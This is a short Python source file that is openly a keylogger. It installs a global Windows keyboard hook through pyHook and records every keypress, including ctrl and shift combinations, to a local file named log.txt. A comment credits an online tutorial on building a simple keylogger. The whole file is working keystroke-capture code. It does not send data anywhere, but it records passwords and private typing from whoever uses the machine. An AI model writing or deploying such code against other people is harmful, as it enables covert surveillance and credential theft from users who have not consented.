from pyHook import HookManager, GetKeyState, HookConstants
from pythoncom import PumpMessages
from sys import stdout
from logging import basicConfig, log, DEBUG
import string

log_file = "log.txt"
basicConfig(filename="log.txt", level=DEBUG, format="%(message)s")

def ctrl_down():
    return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))

def shift_down():
    return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))

def keylog(event):
    key=event.GetKey()
    if ctrl_down() and shift_down():
        log(10, "ctrl+shift+"+key)
    elif ctrl_down():
        if key in string.ascii_uppercase:
            log(10, "ctrl+"+key.lower())
        else:
            log(10, "ctrl+"+key)
    elif shift_down():
        log(10, key)
    else:
        if key in string.ascii_uppercase:
            log(10, key.lower())
        else:
            log(10, key)

# keyboardhooking courtesy of
# http://www.tinkernut.com/2013/07/17/how-to-make-a-simple-python-keylogger
hook = HookManager()
hook.KeyDown = keylog
hook.HookKeyboard()
PumpMessages()

